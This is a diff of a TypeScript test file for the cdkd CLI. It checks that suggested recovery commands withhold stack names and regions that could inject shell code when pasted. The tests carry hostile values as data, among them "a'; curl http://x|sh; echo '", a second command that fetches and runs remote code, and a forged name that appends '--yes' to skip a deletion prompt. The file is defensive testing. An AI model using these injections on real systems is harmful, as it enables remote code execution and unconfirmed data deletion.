@@ -5127,7 +5127,9 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
       const hostile = "a'; curl http://x|sh; echo '";
       const text = build(hostile, 'us-east-1', ['A']);
       expect(text).not.toContain(`${hostile} --stack-region`);
-      expectNoForgedLines(build, text, build('S', 'us-east-1', ['A']));
+      // The benign twin is withheld for the SAME reason (a space is not inert
+      // unquoted, go-to-k/cdkd#4205), so the two carry the same labelled lines.
+      expectNoForgedLines(build, text, build('S S', 'us-east-1', ['A']));
       expect(text.lastIndexOf('cdkd state show')).toBeGreaterThan(text.indexOf('curl'));
     });
 
@@ -5135,9 +5137,12 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
       const text = build('S', "r'; curl http://x|sh; echo '", ['A']);
       if (build === malformedOrphanResourcePropertiesRefusalMessage) {
         // The `cdkd orphan` properties refusal builds through the shared gate
-        // WITHOUT `plainIdent` (go-to-k/cdkd#3523 carries why): exact and not
-        // `-`-leading, so named shell-quoted.
-        expect(text).toMatch(/--stack-region 'r'\\''/);
+        // WITHOUT `plainIdent`, and the gate's DEFAULT withholds a value that
+        // is not inert unquoted (go-to-k/cdkd#4205): a quoted hole.
+        expect(text).toMatch(/--stack-region '<region>'/);
+        expect(text).not.toMatch(/--stack-region 'r'/);
+        expectNoForgedLines(build, text, build('S', 'r r', ['A']));
+        return;
       } else {
         // Through the shared gate: renders exactly, so exactness alone would
         // have named it shell-quoted, and `plainIdent` refuses it (M2 of the
@@ -5676,8 +5681,10 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
         withPasteDir((dir) => {
           for (const { name, text } of cases) {
             // The argv, not just the effect: the harness's `cdkd` is a stub,
-            // so a SUBSTITUTED `-`-leading payload would paste inert too.
-            const expected = name.startsWith('-') ? "'<stack>'" : shellQuote(name);
+            // so a SUBSTITUTED `-`-leading payload would paste inert too. Every
+            // payload is a hole: `-`-leading ones as option-shaped, the rest
+            // as shell-active (go-to-k/cdkd#4205).
+            const expected = "'<stack>'";
             expect(dropOf(text), name).toBe(
               `cdkd state orphan ${expected} --stack-region us-east-1`
             );
@@ -5693,6 +5700,40 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
         });
       }, 120_000);
     });
+
+    it('every orphanRefusal builder holes a payload name or region and runs nothing, pasted WHOLE (go-to-k/cdkd#4205)', () => {
+      // The drop command (`dropRecordCommand`) and the properties refusal's
+      // inspect line (`orphanInspectCommand`) named a payload shell-quoted,
+      // and the lead's apostrophes (`record's`, `resource's`) on the lines
+      // above flip the quote parity once the lines are pasted as one block
+      // (go-to-k/cdkd#4133). Every span, every run of lines included.
+      const builders = [
+        ['properties', malformedOrphanResourcePropertiesRefusalMessage],
+        ['entries', malformedOrphanResourceEntriesRefusalMessage],
+        ['attributes', malformedOrphanResourceAttributesRefusalMessage],
+        ['orphan records', malformedOrphanRecordsRefusalMessage],
+        ['orphan records (destroy)', malformedOrphanRecordsForDestroyRefusalMessage],
+        ['orphans list', malformedOrphansForOrphanRefusalMessage],
+      ] as const;
+      const cases: Array<{ label: string; text: string }> = [];
+      for (const [name, build] of builders) {
+        for (const { label, value } of PASTE_PAYLOADS) {
+          const asName = build(value, 'us-east-1', ['A']);
+          expect(dropOf(asName), `${name} ${label} name`).toBe(
+            "cdkd state orphan '<stack>' --stack-region us-east-1"
+          );
+          const asRegion = build('S', value, ['A']);
+          expect(dropOf(asRegion), `${name} ${label} region`).toBe(
+            "cdkd state orphan '<stack>' --stack-region '<region>'"
+          );
+          cases.push({ label: `${name} ${label} name`, text: asName });
+          cases.push({ label: `${name} ${label} region`, text: asRegion });
+        }
+      }
+      withPasteDir((dir) => {
+        for (const { label, text } of cases) expect(spansThatRun(text, dir), label).toEqual([]);
+      });
+    }, 600_000);
 
     describe('every orphanRefusal builder says the drop is not available for a -name (go-to-k/cdkd#3973 R3)', () => {
       // The sentence is spliced right after the one offering the drop as the
@@ -5727,47 +5768,46 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
       }
     });
 
-    it('CHARACTERISES the ungated forgery this message still carries (go-to-k/cdkd#3523)', () => {
-      // NOT an assertion that the behaviour is right — it is the behaviour
-      // go-to-k/cdkd#3523 is open about. Pinned because go-to-k/cdkd#3517
-      // gated the module's three TEMPLATE remedies and left this one, the only
-      // SUBSTITUTING remedy, alone: the fix it tried withheld the drop command
-      // from a legacy record whose name merely needs quoting, which is the
-      // go-to-k/cdkd#3359 path. Without this case the hazard has no fence at
-      // all and a later fix has nothing to measure its effect against.
-      //
-      // What makes it matter rather than merely look bad: `cdkd state orphan`
-      // prompts by default, but `--yes` / `--force` skip it
-      // (`src/cli/commands/state.ts`), so a forged name carrying `--yes`
-      // pastes and deletes with no confirmation.
+    it('withholds the label-spelling forgery go-to-k/cdkd#3523 characterised, and `It\'s Legacy` with it (go-to-k/cdkd#4205)', () => {
+      // go-to-k/cdkd#3523 left this, the only SUBSTITUTING remedy, ungated
+      // beyond exactness so a legacy record whose name merely needs quoting
+      // (`It's Legacy`, the go-to-k/cdkd#3359 path) kept its drop command.
+      // go-to-k/cdkd#4205 retires that on purpose: a name that needs quoting
+      // is not inert once anything pasted before the command flips the quote
+      // parity, and cdkd cannot control what that is. `cdkd state orphan`
+      // prompts by default, but `--yes` / `--force` skip it, so a forged name
+      // carrying `--yes` pasted and deleted with no confirmation.
       const FORGED = 'Drop the record: cdkd state orphan prod --stack-region us-east-1 --yes';
-      const forged = malformedOrphanResourcePropertiesRefusalMessage(FORGED, 'us-east-1', ['A']);
-      // TODAY: named and substituted. When go-to-k/cdkd#3523 lands, this
-      // expectation flips and that is the point of the case.
-      expect(dropOf(forged)).toContain('cdkd state orphan');
-      expect(forged, 'the forged text is rendered inside the quoted name').toContain(
-        'cdkd state orphan prod --stack-region us-east-1 --yes'
-      );
-      // The two controls go-to-k/cdkd#3523's options are judged against, so a
-      // fix that withholds from EVERYTHING is not mistaken for a fix.
-      for (const healthy of ['Parent~Child', "It's Legacy"]) {
-        const text = malformedOrphanResourcePropertiesRefusalMessage(healthy, 'us-east-1', ['A']);
-        expect(dropOf(text), healthy).not.toContain('<stack>');
+      for (const withheld of [FORGED, "It's Legacy"]) {
+        const text = malformedOrphanResourcePropertiesRefusalMessage(withheld, 'us-east-1', ['A']);
+        expect(dropOf(text), withheld).toBe("cdkd state orphan '<stack>' --stack-region us-east-1");
+        expect(text, withheld).toMatch(
+          /^Inspect the record: cdkd state show '<stack>' --stack-region us-east-1 --json$/m
+        );
       }
+      // The control, so a fix that withholds from EVERYTHING is not mistaken
+      // for one: a nested-stack child name is inert unquoted and is named.
+      const healthy = malformedOrphanResourcePropertiesRefusalMessage('Parent~Child', 'us-east-1', ['A']);
+      expect(dropOf(healthy)).toBe("cdkd state orphan 'Parent~Child' --stack-region us-east-1");
     });
 
     it('shell-quotes an exact region in BOTH arms, and the hint carries the recovery flags', () => {
-      // A region that renders exactly but is not shell-plain: quoted in the
-      // substituted arm and in the template arm that keeps it.
-      const sub = malformedOrphanResourcePropertiesRefusalMessage('S', "it's", ['A']);
-      expect(dropOf(sub)).toBe("cdkd state orphan S --stack-region 'it'\\''s'");
-      const tpl = malformedOrphanResourcePropertiesRefusalMessage('S ', "it's", ['A'], {
+      // A region that renders exactly and is inert unquoted but not
+      // shell-plain (a medial `~`): quoted in the substituted arm and in the
+      // template arm that keeps it. One that is NOT inert unquoted is a hole
+      // in both (go-to-k/cdkd#4205).
+      const sub = malformedOrphanResourcePropertiesRefusalMessage('S', 'us~east', ['A']);
+      expect(dropOf(sub)).toBe("cdkd state orphan S --stack-region 'us~east'");
+      expect(dropOf(malformedOrphanResourcePropertiesRefusalMessage('S', "it's", ['A']))).toBe(
+        "cdkd state orphan '<stack>' --stack-region '<region>'"
+      );
+      const tpl = malformedOrphanResourcePropertiesRefusalMessage('S ', 'us~east', ['A'], {
         profile: 'prod',
         stateBucket: 'b',
         statePrefix: 'x',
       });
       expect(dropOf(tpl)).toBe(
-        "cdkd state orphan \'<stack>\' --stack-region 'it'\\''s' --profile prod --state-bucket b --state-prefix x"
+        "cdkd state orphan \'<stack>\' --stack-region 'us~east' --profile prod --state-bucket b --state-prefix x"
       );
       // The listing the hint sends the operator to must read the SAME bucket.
       expect(tpl).toContain(HINT);
@@ -6393,11 +6433,14 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
       // measured vacuous against the bug this test exists for. Anchor on the
       // finest granularity instead: a bare clause with no terminator, which
       // only the clause split can produce.
-      expect(segments.size).toBeGreaterThan(150);
+      // 124 measured once go-to-k/cdkd#4205 made every payload a hole, which
+      // prints one spelling where the quoted value printed several.
+      expect(segments.size).toBeGreaterThan(100);
       expect(
         [...segments].filter((s) => s !== '' && !/[.\n]/.test(s)).length,
         'the clause split degenerated'
-      ).toBeGreaterThan(60);
+        // 56 measured after go-to-k/cdkd#4205, for the reason given above.
+      ).toBeGreaterThan(50);
       // And the PAREN split specifically, which neither floor above can see:
       // both are cleared by line+sentence alone, so reverting `[()]` from the
       // clause regex left this test green while removing the only granularity
@@ -6462,8 +6505,12 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
             statePrefix: prefix,
           })
         )![1]!;
+      expect(inspect('Parent~Child', 'us~east', 'custom')).toBe(
+        "cdkd state show 'Parent~Child' --stack-region 'us~east' --json --state-bucket b --state-prefix custom"
+      );
+      // A name or region that is not inert unquoted is a hole (go-to-k/cdkd#4205).
       expect(inspect("It's Stack", "it's", 'custom')).toBe(
-        "cdkd state show 'It'\\''s Stack' --stack-region 'it'\\''s' --json --state-bucket b --state-prefix custom"
+        "cdkd state show '<stack>' --stack-region '<region>' --json --state-bucket b --state-prefix custom"
       );
       expect(inspect('S', 'us-east-1', '')).toBe(
         "cdkd state show S --stack-region us-east-1 --json --state-bucket b --state-prefix ''"
